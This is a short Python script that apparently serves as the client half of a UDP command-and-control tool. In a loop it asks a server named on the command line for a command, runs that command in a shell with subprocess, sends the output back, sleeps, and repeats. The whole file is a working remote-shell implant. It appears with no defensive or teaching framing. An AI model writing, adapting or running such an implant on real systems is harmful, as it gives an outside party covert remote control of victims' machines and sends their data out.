from sys import argv

import socket
import subprocess
import time


def connect_svr(svr_ip, svr_port, sleepval):
    '''
    :param svr_ip: String IPv4 addr of the server
    :param svr_port: Int UDP port of the server
    :param sleepval: Int value in seconds to sleep
    :return: Nothing
    '''
    clt_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    clt_sock.sendto('CMD_REQUEST', (svr_ip, svr_port))
    execcmd, svr_addr = clt_sock.recvfrom(4096)
    clt_sock.sendto(execute_cmd(execcmd), (svr_ip, svr_port))
    clt_sock.close()
    time.sleep(sleepval)


def execute_cmd(cmd):
    '''
    :param cmd: String command to execute on the client system.
    :return: String output of the command, will be sent to the server.
    '''
    command = cmd.rstrip()

    try:
        cmd_response = 'CMD_RESPONSE\n' + subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
    except:
        cmd_response = 'CMD_RESPONSE: command failed!\n'

    return cmd_response


def main():
    while True:
        connect_svr(svr_ip, int(svr_port), int(sleepval))


if __name__ == '__main__':
    (scriptname, svr_ip, svr_port, sleepval) = argv
    main()
